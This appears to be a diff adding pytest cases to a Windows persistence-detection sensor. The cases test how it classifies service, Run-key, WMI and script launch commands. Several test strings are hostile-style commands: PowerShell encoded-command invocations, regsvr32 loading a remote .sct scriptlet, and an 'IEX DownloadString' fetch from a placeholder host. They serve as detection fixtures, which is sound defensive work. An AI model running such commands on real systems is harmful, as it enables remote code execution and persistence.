@@ -55,6 +55,104 @@ def test_quoted_service_path_and_ordinary_com_server_do_not_alert():
     ]) == []
 
 
+@pytest.mark.parametrize("command,source", [
+    (r'"C:\Windows\System32\service.exe" --log-file C:\Temp\service.log', "windows.services"),
+    (r'C:\Windows\System32\service.exe --data-dir C:\Users\Public\Cache', "windows.services"),
+    (r'powershell.exe -NoProfile -File C:\Admin\audit.ps1 -OutputPath C:\Temp\audit.log', "windows.run"),
+    (r'powershell.exe -File C:\Admin\audit.ps1 --url https://example.test/report', "windows.run"),
+])
+def test_data_and_log_arguments_do_not_become_executable_targets(command, source):
+    assert sensors.analyze_persistence([persistence_record(command, source)]) == []
+
+
+def test_unquoted_service_is_an_exposure_not_an_authorized_execution_finding():
+    finding, = sensors.analyze_persistence([
+        persistence_record(r'C:\Program Files\Example\svc.exe --service', "windows.services")])
+    assert finding["severity"] == "low"
+    assert finding["finding_kind"] == "exposure"
+    assert finding["response_eligible"] is False
+    assert "writable prefix or execution not established" in finding["eligibility_reason"]
+
+
+@pytest.mark.parametrize("command", [
+    r'powershell.exe -File "C:\Users\Public\payload.ps1" -LogPath C:\Admin\safe.log',
+    r'''powershell.exe -Command "& 'C:\Temp\payload.ps1'"''',
+    r'powershell.exe -Command "Start-Process -FilePath C:\Temp\payload.exe"',
+    r'cmd.exe /c powershell.exe -File C:\Temp\payload.ps1',
+    r'cmd.exe /c ""C:\Temp\payload.exe" arg"',
+    r'cmd.exe /d /s /c C:\Temp\payload.exe',
+    r'python.exe -W ignore C:\Temp\payload.py',
+    'sh -c /tmp/payload.sh',
+    r'powershell.exe -co C:\Temp\payload.ps1',
+    r'pwsh.exe -NoProfile -f C:\Temp\payload.ps1',
+    r'pwsh.exe C:\Temp\payload.ps1 --url https://example.test/log',
+])
+def test_explicit_transient_execution_remains_detected(command):
+    finding, = sensors.analyze_persistence([persistence_record(command)])
+    assert finding["kind"] == "persistence_writable_script"
+    assert finding.get("response_eligible") is not False
+
+
+@pytest.mark.parametrize("switch", ["-e", "-ec", "-en", "-enc", "-encodedc", "-EncodedCommand"])
+def test_powershell_encoded_aliases_remain_execution_findings(switch):
+    for host in ("powershell.exe", "pwsh.exe"):
+        finding, = sensors.analyze_persistence([persistence_record(f"{host} {switch} SQBFAFgA")])
+        assert finding["kind"] == "persistence_encoded_execution"
+
+
+@pytest.mark.parametrize("command", [
+    r'''python.exe -c "print('C:\Temp\example.exe')"''',
+    r'powershell.exe -Command "Write-Output https://example.test/report"',
+    r'cmd.exe /c',
+    r'"C:\Temp\unclosed.exe',
+    r'cmd /c cmd /c cmd /c cmd /c cmd /c C:\Temp\payload.exe',
+])
+def test_unsupported_or_ambiguous_execution_is_unknown_never_clean(command):
+    finding, = sensors.analyze_persistence([persistence_record(command)])
+    assert finding["kind"] == "persistence_parser_ambiguous"
+    assert finding["coverage_status"] == "partial"
+    assert finding["response_eligible"] is False
+    assert "UNKNOWN" in finding["reason"]
+
+
+def test_script_arguments_do_not_become_powershell_host_switches():
+    assert sensors.analyze_persistence([persistence_record(
+        r'powershell.exe -File C:\Admin\audit.ps1 -EncodedCommand SQBFAFgA')]) == []
+
+
+@pytest.mark.parametrize("payload,kind", [
+    ('"https://example.test/payload.sct"', "persistence_remote_execution"),
+    (r'"C:\Temp\payload.sct"', "persistence_writable_script"),
+    (r'"C:\Users\Public\Shared Files\payload.sct"', "persistence_writable_script"),
+])
+def test_regsvr32_quoted_sct_targets_remain_execution_findings(payload, kind):
+    finding, = sensors.analyze_persistence([persistence_record(
+        f'regsvr32.exe /s /n /u /i:{payload} scrobj.dll')])
+    assert finding["kind"] == kind
+    assert finding.get("response_eligible") is not False
+
+
+def test_wmi_inline_remote_and_encoded_content_remain_detected():
+    for script, expected in (("IEX DownloadString('https://example.test/x')", "persistence_remote_execution"),
+                             ("FromBase64String('AAA')", "persistence_encoded_execution")):
+        finding, = sensors.analyze_persistence([{"source": "windows.wmi", "id": "fixture", "script": script}])
+        assert finding["kind"] == expected
+
+
+def test_unknown_execution_analysis_has_partial_coverage_separate_from_inventory(monkeypatch):
+    monkeypatch.setattr(sensors.platform, "system", lambda: "Windows")
+    monkeypatch.setattr(sensors, "winreg", FakeRegistry())
+    monkeypatch.setattr(sensors, "_collect_run", lambda bound: (
+        [persistence_record('powershell -Command "Write-Output hello"')], sensors._coverage("complete", count=1)))
+    for name in ("_collect_com", "_collect_services", "_collect_wmi"):
+        monkeypatch.setattr(sensors, name, lambda bound: ([], sensors._coverage("complete")))
+    monkeypatch.setattr(sensors, "_collect_directories", lambda *args: ([], sensors._coverage("complete")))
+    result = sensors.collect_persistence(20)
+    assert result["coverage"]["windows.run"]["status"] == "complete"
+    assert result["coverage"]["persistence.execution_analysis"]["status"] == "partial"
+    assert result["findings"][0]["response_eligible"] is False
+
+
 def test_unsupported_platform_is_explicit_and_does_no_os_access():
     result = sensors.collect_persistence()
     assert result["records"] == result["findings"] == []
